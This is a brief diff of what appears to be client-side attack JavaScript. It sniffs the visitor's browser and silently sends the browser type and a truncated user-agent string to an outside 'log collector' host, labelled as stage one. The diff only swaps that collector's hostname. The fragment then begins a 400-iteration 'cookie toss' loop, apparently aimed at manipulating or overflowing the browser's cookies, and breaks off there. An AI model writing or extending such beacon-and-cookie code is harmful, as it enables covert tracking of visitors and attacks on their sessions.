@@ -4,7 +4,7 @@
   var isFF = /Firefox\//.test(UA);
   var isCr = !isFF && /Chrome\//.test(UA);
   var b = isFF ? "firefox" : isCr ? "chrome" : "other";
-  try { new Image().src = "https://http-log-collector.netlify.app/api/log?stage1=" + b + "&ua=" + encodeURIComponent(UA.slice(0, 60)); } catch (e) {}
+  try { new Image().src = "https://http-log-collect.netlify.app/api/log?stage1=" + b + "&ua=" + encodeURIComponent(UA.slice(0, 60)); } catch (e) {}
 
   // --- cookie toss ---
   for (let i = 0, p = -1; i < 400; i++) {
